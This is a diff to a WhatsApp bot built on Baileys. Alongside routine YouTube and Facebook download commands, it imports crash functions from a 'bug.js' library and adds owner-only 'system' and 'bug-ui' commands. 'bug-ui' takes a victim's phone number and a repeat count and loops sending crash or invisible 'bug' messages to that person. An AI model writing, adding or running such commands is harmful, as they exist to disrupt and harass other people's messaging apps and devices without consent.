@@ -1,5 +1,15 @@
 
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, processSyncAction } = require("@whiskeysockets/baileys");
+const {
+  Null,
+  Combox,
+  Combox2,
+  CrashUi,
+  InVisiXz,
+  InVisiLoc,
+  DocSystem,
+  DocSystem2
+} = require("./lib/bug.js");
 const fs = require("fs");
 const os = require('os');
 const qs = require("qs");
@@ -25,6 +35,7 @@ const { nhentai } = require("./lib/nh");
 const { doing } = require('./lib/translate')
 const { event } = require("./lib/event.js")
 const { remini } = require("./lib/remini")
+const { ytdls } = require("./lib/youtube-dl.js")
 const { mt } = require("./lib/mt.js")
 const { ind } = require("./language")
 const { eng } = require("./language")
@@ -1391,6 +1402,7 @@ case 'buff':
     proses("✔")
   }
   } catch(e) {
+    if (e.status === 502) reply(e)
     console.error(e)
     proses("❌")
   }
@@ -1828,6 +1840,7 @@ case "join":
 case 'ytmp3': 
   if (!text) return reply(lang.format(prefix, command))
   if (!isUrl(text)) return reply("Please enter the URL!")
+    try{
   proses("⌛")
   /*const header = {
     'Content-Type': 'application/json',
@@ -1841,21 +1854,50 @@ const data = {
   searchResponse = await axios.post("https://submagic-free-tools.fly.dev/api/youtube-to-audio", qs.stringify(data), {header})
   client.sendMessage(from, { audio: {url: searchResponse.data.audioUrl}, mimetype: "audio/mp4", ptt: false}, { quoted: m })
   proses("✔")*/
-  data = await ytdlnew(text)
-  client.sendMessage(from, { audio: { url: data.mp3DownloadLink }, mimetype: 'audio/mp4', title: data.title}, {quoted: m})
+  data = await ytdls(text, "mp3")
+  fileName = getRandom(".mp3")
+  getFile = await axios({
+    url: data.url,
+    method: 'GET',
+    responseType: 'stream'
+  })
+  if(getFile.status == 200) proses("⬇")
+  writer = fs.createWriteStream("./tmp/" + fileName)
+  getFile.data.pipe(writer)
+  writer.on('finish', () => {
+    proses("⬆")
+    client.sendMessage(from, { audio: { url: "./tmp/" + fileName }, mimetype: 'audio/mp4', title: data.title}, {quoted: m})
+  })
+  writer.on('open', () => proses('🔄'))
+  writer.on('error', () => proses('❌'))
+  writer.on('close', () => proses("✔"))
   proses("✔")
+  } catch(err) {
+    proses("❌")
+    console.log(err)
+  }
 break
 
 case 'ytmp4':
   if (!text) return reply(lang.format(prefix, command))
   if (!isUrl(text)) return reply("Please enter the URL!")
+    try{
   proses("⌛")
-  searchResponse = await ytdlnew(text)
+  searchResponse = await ytdls(text, "mp4")
   const ytc = `*[ YOUTUBE DOWNLOADER ]*
+*Title:* ${searchResponse.title}
+*Channel:* ${searchResponse.channel}
+*Subscriber:* ${searchResponse.subscriber}
+*View Count:* ${searchResponse.viewCount}
+*Likes:* ${searchResponse.likes}
   
   ©${botName}`;
-  client.sendMessage(from, { video: { url: searchResponse.mp4DownloadLink }, caption: ytc }, { quoted: m })
+  client.sendMessage(from, { video: { url: searchResponse.url }, caption: ytc }, { quoted: m })
   proses("✔")
+  } catch(err) {
+    proses('❌')
+    console.log(err)
+  }
 break
 
 case 'play':
@@ -1864,20 +1906,21 @@ case 'play':
       proses("⌛");
       search = await yts(text);
       video = search.videos[0];
+      if (video.url !== undefined) proses("🔍")
       let { title, thumbnail, timestamp, views, ago, url } = video;
-      mp3Url = await ytdlnew(url)
-      ;
+      fileName = getRandom(".mp3")
+      mp3Url = await ytdls(url, "mp3", fileName);
       getFile = await axios({
-        url: mp3Url.mp3DownloadLink,
+        url: mp3Url.url,
         method: 'GET',
         responseType: 'stream'
       })
-      format = getRandom(".mp3")
-      writer = fs.createWriteStream("./tmp/" + format)
-      response.data.pipe(writer)
+      if(getFile.status === 200) proses("⬇")
+      writer = fs.createWriteStream("./tmp/" + fileName)
+      getFile.data.pipe(writer)
       mp3File = {
         audio: {
-          url: `./tmp/${format}`
+          url: `./tmp/${fileName}`
         },
         mimetype: 'audio/mp4',
         fileName: `${title}`,
@@ -1892,11 +1935,13 @@ case 'play':
           }
         }
       }
-      await new Promise((resolve, reject) => {
-        writer.on('finish', resolve(client.sendMessage(from, mp3File)))
-        writer.on('error', reject(proses('❌')))
-      })
-      writer.on('close', proses("✔"))
+        writer.on('finish', () => {
+          proses("⬆")
+          client.sendMessage(from, mp3File)
+        }) 
+        writer.on('open', () => proses('🔄'))
+        writer.on('error', () => proses('❌'))
+        writer.on('close', () => proses("✔"))
   } catch (err) {
     proses('❌')
     console.log(err)
@@ -2014,10 +2059,41 @@ case 'play':
                 proses("✔")
             
             } catch(err) {
+
                 proses("❌")
                 console.log(err)
             }
             break
+
+            case 'fb2': 
+            case 'fb3':
+            if (!q) return reply(lang.format(prefix, command))
+            if (!isUrl(text)) return reply("Please enter the URL!")
+              try{
+            proses("⏳")
+            if(command === "fb2") {
+              data = await axios({
+                url: `https://btch.us.kg/download/fbdl?url=${encodeURIComponent(text)}`,
+                method: 'GET',
+                responseType: 'json'
+              })
+              res = data.data.result.HD ? data.data.result.HD : data.data.result.Normal_video
+              client.sendMessage(from, {video: {url: res}, caption: ` `}, mek)
+              proses("✔")
+            }
+            if(command == "fb3") {
+              source = await axios.get(`https://api.tioprm.eu.org/download/fbdown?url=${encodeURIComponent(text)}`)
+      			  res = source.data.result.url.isHdAvailable ? source.data.result.url.urls[0].hd : source.data.result.url.urls[1].sd
+       			  client.sendMessage(from, {video: {url: res}, caption: ` `}, mek)
+              proses("✔")
+            }
+            }catch(e) {
+
+              proses("❌")
+              console.log(e)
+            }
+            break
+
 
 
   case 'ig':
@@ -2113,10 +2189,39 @@ case 'reset':
           remove('./tmp', ".pdf")
           remove('./tmp', '.mp3')
           remove('./tmp', '.webp')
+          remove('./tmp', '.jpg')
           proses("✔")
             break
 
-
+            case 'system': 
+              if (!isOwner) return reply(lang.owner())
+              proses("⏳")
+              jumlah = 50
+              await Combox(client, from, jumlah)
+              await CrashUi(client, target)
+              await InVisiXz(client, target)
+              await InVisiLoc(client, target)
+              await Combox2(client, from, jumlah)
+              proses("✔")
+              break
+              
+              case 'bug-ui':
+                if (!isOwner) return reply(lang.owner())
+                if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ :\n ${prefix + command} 62xxxx|5`)
+                victim = q.split("|")[0]
+                jumlah = q.split("|")[1]
+                target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+                proses("⏳")
+                
+                for (let i = 0; i < parseInt(jumlah); i++) {
+                  await Combox(client, target)
+                  await DocSystem2(client, target, Null)
+                  await CrashUi(client, target)
+                  await InVisiXz(client, target)
+                  await InVisiLoc(client, target)
+                }
+                proses("✔")
+                break
 
  
         default: {
